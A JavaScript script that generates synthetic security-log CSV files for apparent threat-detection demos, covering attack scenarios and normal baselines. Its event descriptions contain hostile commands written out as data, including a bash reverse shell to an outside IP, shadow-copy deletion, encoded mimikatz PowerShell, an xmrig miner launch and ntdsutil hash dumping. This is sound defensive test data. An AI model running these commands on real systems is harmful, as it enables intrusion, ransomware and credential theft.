import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const header = 'event_id,timestamp,event_type,user_id,device_id,ip_address,application,server_id,destination_ip,severity,description\n';

// 1. Account Compromise (Rahul Sharma / USR101 - Cloud DevOps)
const threat1Events = [
  'E1001,2026-10-07 22:01:10,LOGIN,USR101,DEV099,185.44.21.8,VPN Gateway,,,medium,"Unusual login attempt from unmapped external IP 185.44.21.8"',
  'E1002,2026-10-07 22:02:05,FAILED_LOGIN,USR101,DEV099,185.44.21.8,VPN Gateway,,,high,"Failed authentication attempt (Password mismatch)"',
  'E1003,2026-10-07 22:02:15,FAILED_LOGIN,USR101,DEV099,185.44.21.8,VPN Gateway,,,high,"Failed authentication attempt (Password mismatch)"',
  'E1004,2026-10-07 22:02:24,FAILED_LOGIN,USR101,DEV099,185.44.21.8,VPN Gateway,,,high,"Failed authentication attempt (Password mismatch)"',
  'E1005,2026-10-07 22:02:40,FAILED_LOGIN,USR101,DEV099,185.44.21.8,VPN Gateway,,,high,"Failed authentication attempt (Password mismatch)"',
  'E1006,2026-10-07 22:03:02,FAILED_LOGIN,USR101,DEV099,185.44.21.8,VPN Gateway,,,high,"Failed authentication attempt (Password mismatch)"',
  'E1007,2026-10-07 22:03:30,LOGIN_SUCCESS,USR101,DEV099,185.44.21.8,VPN Gateway,,,medium,"Successful authentication following multiple failed attempts"',
  'E1008,2026-10-07 22:04:10,VPN_CONNECTION,USR101,DEV099,185.44.21.8,VPN Gateway,,,high,"VPN session established from unrecognized device DEV099"',
  'E1009,2026-10-07 22:07:00,SERVER_ACCESS,USR101,DEV099,185.44.21.8,SSH Bastion,SRV012,,high,"Privileged SSH session established to Finance-Database SRV012"',
  'E1010,2026-10-07 22:09:15,PROCESS_EXECUTION,USR101,DEV099,185.44.21.8,CrowdStrike EDR,SRV012,,critical,"Suspicious PowerShell command: powershell -e aW52b2tlLW1pbWlrYXR6"',
  'E1011,2026-10-07 22:10:30,PRIVILEGE_ESCALATION,USR101,DEV099,185.44.21.8,Active Directory,SRV012,,critical,"Unauthorized token duplication to NT AUTHORITY\\SYSTEM"',
  'E1012,2026-10-07 22:12:00,FILE_ACCESS,USR101,DEV099,185.44.21.8,Finance DB,SRV012,,high,"Bulk file access: 420 financial ledger records extracted from SRV012"',
  'E1013,2026-10-07 22:14:00,NETWORK_CONNECTION,USR101,DEV099,185.44.21.8,Palo Alto Firewall,SRV012,185.44.21.8,critical,"High volume outbound encrypted traffic stream to 185.44.21.8"'
];

// 2. Lateral Movement (Priya Verma / USR205 - Senior SysAdmin)
const threat2Events = [
  'E2001,2026-10-07 21:05:10,LOGIN,USR205,DEV020,172.16.4.25,Okta SSO,,,low,"User login from primary workstation DEV020"',
  'E2002,2026-10-07 21:10:20,SERVER_ACCESS,USR205,DEV020,172.16.4.25,Windows RDP,SRV003,,medium,"RDP connection established to Auth-Server-03 SRV003"',
  'E2003,2026-10-07 21:15:30,PROCESS_EXECUTION,USR205,DEV020,172.16.4.25,CrowdStrike EDR,SRV003,,high,"WMI query invoked to enumerate domain controller admin credentials"',
  'E2004,2026-10-07 21:20:40,PRIVILEGE_ESCALATION,USR205,DEV020,172.16.4.25,Active Directory,SRV003,,critical,"Domain Admin privileges granted via Kerberoasting ticket reuse"',
  'E2005,2026-10-07 21:28:00,NETWORK_CONNECTION,USR205,DEV020,172.16.4.25,Palo Alto Firewall,SRV003,10.0.8.50,high,"Lateral SMB connection initiated from SRV003 to SRV008"',
  'E2006,2026-10-07 21:35:10,SERVER_ACCESS,USR205,DEV020,172.16.4.25,SSH Bastion,SRV014,,critical,"Pivoted lateral connection established to Core-Vault-14 SRV014"',
  'E2007,2026-10-07 21:40:20,FILE_ACCESS,USR205,DEV020,172.16.4.25,Admin Console,SRV014,,critical,"Sensitive credential vault dumping executed on SRV014"'
];

// 3. Data Exfiltration (Vikram Patel / USR310 - Finance Controller)
const threat3Events = [
  'E3001,2026-10-07 23:15:00,FAILED_LOGIN,USR310,DEV088,91.22.18.4,VPN Gateway,,,high,"Multiple failed logins from new external IP 91.22.18.4"',
  'E3002,2026-10-07 23:16:10,FAILED_LOGIN,USR310,DEV088,91.22.18.4,VPN Gateway,,,high,"Authentication failure on unrecognized device DEV088"',
  'E3003,2026-10-07 23:18:20,LOGIN_SUCCESS,USR310,DEV088,91.22.18.4,VPN Gateway,,,medium,"Late night login from unrecognized device DEV088"',
  'E3004,2026-10-07 23:22:10,SERVER_ACCESS,USR310,DEV088,91.22.18.4,SSH Bastion,SRV004,,high,"Access granted to File-Repository-04 SRV004"',
  'E3005,2026-10-07 23:26:40,FILE_ACCESS,USR310,DEV088,91.22.18.4,DLP Sentinel,SRV004,,high,"Mass file read: 1400 confidential engineering archives accessed"',
  'E3006,2026-10-07 23:31:10,COMMAND_EXECUTION,USR310,DEV088,91.22.18.4,CrowdStrike EDR,SRV004,,critical,"Staging command executed: tar -czf exfil.tar.gz /var/confidential/"',
  'E3007,2026-10-07 23:35:00,NETWORK_CONNECTION,USR310,DEV088,91.22.18.4,Palo Alto Firewall,SRV004,91.22.18.4,critical,"Outbound TCP connection sending exfil payload stream to 91.22.18.4"'
];

// 4. Ransomware Staging (Siddharth Rao / USR104 - Lead Architect)
const threat4Events = [
  'E4001,2026-10-07 19:10:00,EMAIL_LOGIN,USR104,DEV005,10.10.20.25,Email Exchange,,,low,"Standard email client authentication"',
  'E4002,2026-10-07 19:12:30,NETWORK_CONNECTION,USR104,DEV005,10.10.20.25,Palo Alto Firewall,,198.51.100.44,high,"Outbound HTTP request to suspicious external hosting domain 198.51.100.44"',
  'E4003,2026-10-07 19:14:00,PROCESS_EXECUTION,USR104,DEV005,10.10.20.25,CrowdStrike EDR,,198.51.100.44,critical,"Suspicious child process spawned: wscript.exe malicious_invoice.vbs"',
  'E4004,2026-10-07 19:18:20,COMMAND_EXECUTION,USR104,DEV005,10.10.20.25,CrowdStrike EDR,SRV015,,critical,"Ransomware prep command executed: vssadmin delete shadows /all /quiet"',
  'E4005,2026-10-07 19:22:00,SERVER_ACCESS,USR104,DEV005,10.10.20.25,SSH Bastion,SRV015,,critical,"Rapid batch connection to Backup-Storage-15 SRV015"',
  'E4006,2026-10-07 19:25:00,FILE_ACCESS,USR104,DEV005,10.10.20.25,DLP Sentinel,SRV015,,critical,"High frequency file rename / encryption detected (.locked extension)"'
];

// 5. Insider Threat (Rohan Mehta / USR105 - Account Executive)
const threat5Events = [
  'E5001,2026-10-07 23:45:00,LOGIN,USR105,DEV006,10.10.20.30,Okta SSO,,,low,"Off-hours authentication by Account Executive Rohan Mehta"',
  'E5002,2026-10-07 23:48:15,SERVER_ACCESS,USR105,DEV006,10.10.20.30,SSH Bastion,SRV011,,high,"Unusual access to Customer-DB-11 SRV011 by Sales personnel"',
  'E5003,2026-10-07 23:51:00,COMMAND_EXECUTION,USR105,DEV006,10.10.20.30,CrowdStrike EDR,SRV011,,high,"Database dump query executed: SELECT * FROM enterprise_client_leads INTO OUTFILE"',
  'E5004,2026-10-07 23:55:20,FILE_ACCESS,USR105,DEV006,10.10.20.30,DLP Sentinel,SRV011,,critical,"Mass export: 25000 customer contact and contract records downloaded"',
  'E5005,2026-10-07 23:58:00,NETWORK_CONNECTION,USR105,DEV006,10.10.20.30,Palo Alto Firewall,SRV011,198.51.100.44,critical,"Personal cloud storage sync upload initiated to external IP"'
];

// 6. Cloud API Key Leak & IAM Abuse (Deepa Nair / USR106 - Cloud Infrastructure Engineer)
const threat6Events = [
  'E6001,2026-10-07 20:05:12,API_ACCESS,USR106,DEV010,194.26.29.112,AWS IAM Console,,,high,"Anomalous AWS API call GetCallerIdentity using long-term access key from foreign IP 194.26.29.112"',
  'E6002,2026-10-07 20:07:45,COMMAND_EXECUTION,USR106,DEV010,194.26.29.112,CloudTrail,SRV010,,critical,"Automated reconnaissance: aws s3 ls and aws ec2 describe-instances invoked via CLI"',
  'E6003,2026-10-07 20:10:30,PRIVILEGE_ESCALATION,USR106,DEV010,194.26.29.112,AWS IAM,SRV010,,critical,"Unauthorized IAM policy modification: AdministratorAccess attached to rogue user"',
  'E6004,2026-10-07 20:14:15,SERVER_ACCESS,USR106,DEV010,194.26.29.112,AWS Systems Manager,SRV010,,high,"SSM session initiated to production Kubernetes cluster master node"',
  'E6005,2026-10-07 20:18:00,FILE_ACCESS,USR106,DEV010,194.26.29.112,AWS S3,SRV010,,critical,"S3 bucket production-customer-secrets dumped (sync command executed)"',
  'E6006,2026-10-07 20:22:40,NETWORK_CONNECTION,USR106,DEV010,194.26.29.112,Palo Alto Firewall,SRV010,194.26.29.112,critical,"Outbound HTTPS multi-part archive upload stream directed to external server"'
];

// 7. Password Spraying & Tor Exit Brute-Force (Karan Malhotra / USR107 - Product Manager)
const threat7Events = [
  'E7001,2026-10-07 03:10:00,FAILED_LOGIN,USR107,DEV011,185.220.101.5,Okta SSO,,,high,"Password spraying attempt from known Tor Exit Node 185.220.101.5"',
  'E7002,2026-10-07 03:10:08,FAILED_LOGIN,USR107,DEV011,185.220.101.5,Okta SSO,,,high,"Repeated authentication failure with dictionary password hash"',
  'E7003,2026-10-07 03:10:15,FAILED_LOGIN,USR107,DEV011,185.220.101.5,Okta SSO,,,high,"Repeated authentication failure from Tor network node"',
  'E7004,2026-10-07 03:10:22,FAILED_LOGIN,USR107,DEV011,185.220.101.5,Okta SSO,,,high,"Brute-force spray burst detected across enterprise endpoint"',
  'E7005,2026-10-07 03:12:00,LOGIN_SUCCESS,USR107,DEV011,185.220.101.5,Okta SSO,,,critical,"Compromised login achieved via password spray from Tor IP 185.220.101.5"',
  'E7006,2026-10-07 03:15:20,SERVER_ACCESS,USR107,DEV011,185.220.101.5,SSH Bastion,SRV005,,high,"Unauthorized jump host login to Internal-App-05 SRV005"',
  'E7007,2026-10-07 03:20:10,PROCESS_EXECUTION,USR107,DEV011,185.220.101.5,CrowdStrike EDR,SRV005,,critical,"Discovery script executed: find / -perm -4000 -type f 2>/dev/null"'
];

// 8. Supply Chain Package Poisoning & C2 Beaconing (Neha Gupta / USR108 - Fullstack Developer)
const threat8Events = [
  'E8001,2026-10-07 15:30:10,LOGIN,USR108,DEV012,10.10.20.45,Okta SSO,,,low,"Developer login from engineering workstation DEV012"',
  'E8002,2026-10-07 15:35:20,PROCESS_EXECUTION,USR108,DEV012,10.10.20.45,CrowdStrike EDR,,45.154.255.89,critical,"Malicious postinstall script executed during npm install malicious-analytics-lib"',
  'E8003,2026-10-07 15:37:00,COMMAND_EXECUTION,USR108,DEV012,10.10.20.45,CrowdStrike EDR,,45.154.255.89,critical,"Reverse TCP shell spawned: /bin/bash -i >& /dev/tcp/45.154.255.89/4444 0>&1"',
  'E8004,2026-10-07 15:40:15,NETWORK_CONNECTION,USR108,DEV012,10.10.20.45,Palo Alto Firewall,,45.154.255.89,critical,"Persistent C2 beaconing heartbeat detected every 15 seconds to 45.154.255.89"',
  'E8005,2026-10-07 15:45:00,SERVER_ACCESS,USR108,DEV012,10.10.20.45,SSH Bastion,SRV007,,critical,"Infiltrated session pivoting to CI/CD Build-Server SRV007"',
  'E8006,2026-10-07 15:50:30,FILE_ACCESS,USR108,DEV012,10.10.20.45,GitLab CI,SRV007,,critical,"Injected malicious backdoor payload into production deployment pipeline"'
];

// 9. Cryptojacking & Resource Hijacking (Arjun Kapoor / USR109 - AI/ML Engineer)
const threat9Events = [
  'E9001,2026-10-07 18:20:00,LOGIN,USR109,DEV014,103.208.220.10,VPN Gateway,,,medium,"Login from remote residential ISP proxy 103.208.220.10"',
  'E9002,2026-10-07 18:24:15,SERVER_ACCESS,USR109,DEV014,103.208.220.10,SSH Bastion,SRV016,,high,"SSH session established to GPU-Cluster-Node-16 SRV016"',
  'E9003,2026-10-07 18:28:40,PROCESS_EXECUTION,USR109,DEV014,103.208.220.10,CrowdStrike EDR,SRV016,,critical,"Unauthorized binary execution: ./xmrig --donate-level 1 -o pool.supportxmr.com:3333"',
  'E9004,2026-10-07 18:32:00,COMMAND_EXECUTION,USR109,DEV014,103.208.220.10,CrowdStrike EDR,SRV016,,high,"Process masquerading: xmrig renamed to systemd-journal-daemon to evade detection"',
  'E9005,2026-10-07 18:40:00,NETWORK_CONNECTION,USR109,DEV014,103.208.220.10,Palo Alto Firewall,SRV016,103.208.220.10,critical,"Continuous stratum mining protocol telemetry on TCP port 3333"'
];

// 10. Privilege Escalation & Domain Takeover (Meera Joshi / USR110 - Database Administrator)
const threat10Events = [
  'E10001,2026-10-07 17:05:00,LOGIN,USR110,DEV015,10.10.20.60,Okta SSO,,,low,"Routine DBA login from desktop DEV015"',
  'E10002,2026-10-07 17:10:30,SERVER_ACCESS,USR110,DEV015,10.10.20.60,SSH Bastion,SRV013,,high,"Privileged session connected to Core-Directory-13 SRV013"',
  'E10003,2026-10-07 17:15:00,PROCESS_EXECUTION,USR100,DEV015,10.10.20.60,CrowdStrike EDR,SRV013,,critical,"Exploitation of CVE-2024-PrivEsc via local sudoers vulnerability"',
  'E10004,2026-10-07 17:18:45,PRIVILEGE_ESCALATION,USR110,DEV015,10.10.20.60,Active Directory,SRV013,,critical,"Rogue Enterprise Admin group membership granted without change approval"',
  'E10005,2026-10-07 17:22:10,COMMAND_EXECUTION,USR110,DEV015,10.10.20.60,CrowdStrike EDR,SRV013,,critical,"ntdsutil snapshot create command executed to extract corporate password hashes"',
  'E10006,2026-10-07 17:28:00,FILE_ACCESS,USR110,DEV015,10.10.20.60,Directory Vault,SRV013,,critical,"ntds.dit database archive compressed into encrypted volume"'
];

// 11. Normal User Baseline 1 (Ananya Roy / USR001 - Sales Executive)
const normal1Events = [
  'E0001,2026-10-07 09:02:15,LOGIN,USR001,DEV002,10.10.20.12,Okta SSO,,,low,"Standard user login during normal office hours"',
  'E0002,2026-10-07 09:03:00,MFA_SUCCESS,USR001,DEV002,10.10.20.12,Okta SSO,,,low,"MFA push notification approved on primary mobile device"',
  'E0003,2026-10-07 09:15:30,SERVER_ACCESS,USR001,DEV002,10.10.20.12,Salesforce CRM,SRV001,,low,"Standard CRM access for pipeline review"',
  'E0004,2026-10-07 10:30:00,API_ACCESS,USR001,DEV002,10.10.20.12,Slack Enterprise,,,low,"Team messaging communication active"',
  'E0005,2026-10-07 12:45:00,FILE_ACCESS,USR001,DEV002,10.10.20.12,Google Workspace,,,low,"Sales presentation deck edited"',
  'E0006,2026-10-07 17:30:00,LOGOUT,USR001,DEV002,10.10.20.12,Okta SSO,,,low,"Normal employee logout at end of shift"'
];

// 12. Normal User Baseline 2 (Aditya Sen / USR002 - Software Engineer)
const normal2Events = [
  'E0101,2026-10-07 09:30:10,LOGIN,USR002,DEV007,10.10.20.15,Okta SSO,,,low,"Developer login from primary corporate laptop DEV007"',
  'E0102,2026-10-07 09:31:00,MFA_SUCCESS,USR002,DEV007,10.10.20.15,Okta SSO,,,low,"FIDO2 hardware token verification confirmed"',
  'E0103,2026-10-07 10:00:20,API_ACCESS,USR002,DEV007,10.10.20.15,GitHub Enterprise,,,low,"Git clone and pull of internal frontend repository"',
  'E0104,2026-10-07 11:45:00,SERVER_ACCESS,USR002,DEV007,10.10.20.15,Staging K8s,SRV002,,low,"Standard kubectl logs command on dev staging cluster"',
  'E0105,2026-10-07 14:20:00,FILE_ACCESS,USR002,DEV007,10.10.20.15,Jira Software,,,low,"Updated sprint story acceptance criteria"',
  'E0106,2026-10-07 18:00:00,LOGOUT,USR002,DEV007,10.10.20.15,Okta SSO,,,low,"Graceful user session sign-out"'
];

// 13. False Positive Audit Pass (Amit Kulkarni / USR102 - IT Systems Engineer)
const falsePositiveEvents = [
  'E7001,2026-10-07 14:00:10,LOGIN,USR102,DEV003,10.10.20.18,Okta SSO,,,low,"Scheduled finance audit login from primary device DEV003"',
  'E7002,2026-10-07 14:01:00,MFA_SUCCESS,USR102,DEV003,10.10.20.18,Okta SSO,,,low,"Hardware token MFA authentication verified"',
  'E7003,2026-10-07 14:02:15,SERVER_ACCESS,USR102,DEV003,10.10.20.18,SSH Bastion,SRV012,,medium,"Scheduled audit access to Finance-Database SRV012 under change ticket CHG-8821"',
  'E7004,2026-10-07 14:05:00,FILE_ACCESS,USR102,DEV003,10.10.20.18,Finance DB,SRV012,,low,"Read operation on quarterly audit ledger table"',
  'E7005,2026-10-07 14:15:00,LOGOUT,USR102,DEV003,10.10.20.18,Okta SSO,,,low,"Normal audit session closed successfully with approved change ticket"'
];

// 14. Blended Enterprise Day Shift (Multi-User Concurrent Traffic with Correlated Attacks)
const blendedEvents = [
  ...normal1Events,
  ...threat1Events.slice(0, 7),
  ...normal2Events,
  ...threat2Events.slice(0, 5),
  ...threat1Events.slice(7),
  ...threat3Events,
  ...falsePositiveEvents,
  ...threat2Events.slice(5)
];

const filesToGenerate = [
  { name: 'threat_1_account_compromise_rahul.csv', events: threat1Events },
  { name: 'threat_2_lateral_movement_priya.csv', events: threat2Events },
  { name: 'threat_3_data_exfiltration_vikram.csv', events: threat3Events },
  { name: 'threat_4_ransomware_staging_siddharth.csv', events: threat4Events },
  { name: 'threat_5_insider_threat_rohan.csv', events: threat5Events },
  { name: 'threat_6_api_token_leak_deepa.csv', events: threat6Events },
  { name: 'threat_7_brute_force_spray_karan.csv', events: threat7Events },
  { name: 'threat_8_supply_chain_poison_neha.csv', events: threat8Events },
  { name: 'threat_9_crypto_mining_arjun.csv', events: threat9Events },
  { name: 'threat_10_privilege_escalation_meera.csv', events: threat10Events },
  { name: 'normal_user_ananya.csv', events: normal1Events },
  { name: 'normal_user_aditya.csv', events: normal2Events },
  { name: 'false_positive_audit_amit.csv', events: falsePositiveEvents },
  { name: 'multi_user_enterprise_day_shift.csv', events: blendedEvents },
];

fs.mkdirSync(path.join(__dirname, 'demo-data'), { recursive: true });
fs.mkdirSync(path.join(__dirname, 'public', 'demo-data'), { recursive: true });

filesToGenerate.forEach((file) => {
  const content = header + file.events.join('\n') + '\n';
  fs.writeFileSync(path.join(__dirname, 'demo-data', file.name), content);
  fs.writeFileSync(path.join(__dirname, 'public', 'demo-data', file.name), content);
  console.log(`Generated ${file.name}`);
});

console.log(`\nAll ${filesToGenerate.length} test CSV files generated successfully!`);
